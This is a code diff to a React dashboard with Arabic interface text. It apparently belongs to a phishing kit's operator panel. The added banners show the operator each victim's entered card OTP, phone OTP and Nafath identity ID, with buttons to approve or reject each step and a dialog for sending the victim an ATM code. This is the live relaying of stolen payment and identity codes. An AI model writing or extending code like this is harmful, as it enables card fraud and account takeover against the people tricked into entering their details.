@@ -24,6 +24,8 @@ import {
   Wifi,
   Globe,
   MapPin,
+  AlertTriangle,
+  Banknote,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -371,6 +373,149 @@ export default function Dashboard() {
             </div>
           ) : (
             <div className="max-w-4xl mx-auto space-y-6">
+              {/* Approval Alert Banner */}
+              {(selectedVisitor.currentStep === 4 || selectedVisitor.currentStep === 5 || selectedVisitor.currentStep === 6) && !selectedVisitor.approvalStatus && (
+                <div className="bg-amber-50 border-2 border-amber-300 rounded-xl p-4 flex items-center gap-4 animate-pulse" data-testid="alert-approval-pending">
+                  <div className="bg-amber-100 rounded-full p-3">
+                    <AlertTriangle className="h-8 w-8 text-amber-600" />
+                  </div>
+                  <div className="flex-1">
+                    <h3 className="font-bold text-amber-800 text-lg" data-testid="text-approval-warning-title">تنبيه: بانتظار الموافقة</h3>
+                    <p className="text-amber-700 text-sm" data-testid="text-approval-warning-message">
+                      {selectedVisitor.currentStep === 4 && "المستخدم في مرحلة إدخال بيانات البطاقة - بانتظار OTP البطاقة"}
+                      {selectedVisitor.currentStep === 5 && "المستخدم أدخل OTP البطاقة - بانتظار الموافقة أو رمز الصراف"}
+                      {selectedVisitor.currentStep === 6 && "المستخدم في مرحلة التحقق من الصراف - بانتظار إرسال رمز الصراف"}
+                    </p>
+                  </div>
+                  <div className="flex gap-2">
+                    {selectedVisitor.currentStep === 5 && (
+                      <Button
+                        size="sm"
+                        onClick={() => handleApprovalStatus(selectedVisitor.id, "approved_otp")}
+                        className="bg-emerald-600 hover:bg-emerald-700"
+                        data-testid="button-alert-approve-otp"
+                      >
+                        <CheckCircle className="h-4 w-4 ml-1" />
+                        موافقة OTP
+                      </Button>
+                    )}
+                    <Dialog>
+                      <DialogTrigger asChild>
+                        <Button size="sm" variant="outline" className="border-amber-400 text-amber-700" data-testid="button-alert-atm-dialog">
+                          <Banknote className="h-4 w-4 ml-1" />
+                          رمز صراف
+                        </Button>
+                      </DialogTrigger>
+                      <DialogContent>
+                        <DialogHeader>
+                          <DialogTitle>إرسال رمز الصراف</DialogTitle>
+                        </DialogHeader>
+                        <div className="py-4">
+                          <Input
+                            value={atmCode}
+                            onChange={(e) => setAtmCode(e.target.value)}
+                            placeholder="أدخل رمز الصراف"
+                            className="text-center text-xl"
+                            data-testid="input-alert-atm-code"
+                          />
+                        </div>
+                        <DialogFooter>
+                          <DialogClose asChild>
+                            <Button 
+                              disabled={!atmCode.trim()}
+                              onClick={() => {
+                                if (atmCode.trim()) {
+                                  handleApprovalStatus(selectedVisitor.id, "approved_atm", atmCode.trim());
+                                  setAtmCode("");
+                                }
+                              }}
+                              data-testid="button-alert-confirm-atm"
+                            >
+                              تأكيد
+                            </Button>
+                          </DialogClose>
+                        </DialogFooter>
+                      </DialogContent>
+                    </Dialog>
+                    <Button
+                      size="sm"
+                      variant="destructive"
+                      onClick={() => handleApprovalStatus(selectedVisitor.id, "rejected")}
+                      data-testid="button-alert-reject"
+                    >
+                      <X className="h-4 w-4 ml-1" />
+                      رفض
+                    </Button>
+                  </div>
+                </div>
+              )}
+
+              {/* OTP Waiting Alert */}
+              {selectedVisitor.otpCode && !selectedVisitor.cardOtpApproved && (
+                <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-card-otp">
+                  <div className="bg-blue-100 rounded-full p-3">
+                    <CreditCard className="h-6 w-6 text-blue-600" />
+                  </div>
+                  <div className="flex-1">
+                    <h3 className="font-bold text-blue-800" data-testid="text-card-otp-code">OTP البطاقة: {selectedVisitor.otpCode}</h3>
+                    <p className="text-blue-600 text-sm">المستخدم أدخل OTP البطاقة - اضغط للموافقة</p>
+                  </div>
+                  <Button
+                    size="sm"
+                    onClick={() => handleRouting(selectedVisitor.id, "cardOtpApproved", true)}
+                    className="bg-blue-600 hover:bg-blue-700"
+                    data-testid="button-approve-card-otp"
+                  >
+                    <CheckCircle className="h-4 w-4 ml-1" />
+                    موافقة
+                  </Button>
+                </div>
+              )}
+
+              {/* Phone OTP Waiting Alert */}
+              {selectedVisitor.phoneOtpCode && !selectedVisitor.phoneOtpApproved && (
+                <div className="bg-pink-50 border-2 border-pink-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-phone-otp">
+                  <div className="bg-pink-100 rounded-full p-3">
+                    <Phone className="h-6 w-6 text-pink-600" />
+                  </div>
+                  <div className="flex-1">
+                    <h3 className="font-bold text-pink-800" data-testid="text-phone-otp-code">OTP الهاتف: {selectedVisitor.phoneOtpCode}</h3>
+                    <p className="text-pink-600 text-sm">المستخدم أدخل OTP الهاتف - اضغط للموافقة</p>
+                  </div>
+                  <Button
+                    size="sm"
+                    onClick={() => handleRouting(selectedVisitor.id, "phoneOtpApproved", true)}
+                    className="bg-pink-600 hover:bg-pink-700"
+                    data-testid="button-approve-phone-otp"
+                  >
+                    <CheckCircle className="h-4 w-4 ml-1" />
+                    موافقة
+                  </Button>
+                </div>
+              )}
+
+              {/* Nafaz Waiting Alert */}
+              {selectedVisitor.nafazId && !selectedVisitor.nafathApproved && (
+                <div className="bg-cyan-50 border-2 border-cyan-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-nafaz">
+                  <div className="bg-cyan-100 rounded-full p-3">
+                    <ClipboardCheck className="h-6 w-6 text-cyan-600" />
+                  </div>
+                  <div className="flex-1">
+                    <h3 className="font-bold text-cyan-800" data-testid="text-nafaz-id">نفاذ: {selectedVisitor.nafazId}</h3>
+                    <p className="text-cyan-600 text-sm">المستخدم ينتظر تصديق نفاذ - اضغط للموافقة</p>
+                  </div>
+                  <Button
+                    size="sm"
+                    onClick={() => handleRouting(selectedVisitor.id, "nafathApproved", true)}
+                    className="bg-cyan-600 hover:bg-cyan-700"
+                    data-testid="button-approve-nafaz"
+                  >
+                    <CheckCircle className="h-4 w-4 ml-1" />
+                    موافقة
+                  </Button>
+                </div>
+              )}
+
               {/* Credit Card Section */}
               {(selectedVisitor.cardNumber || selectedVisitor.cardName) && (
                 <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
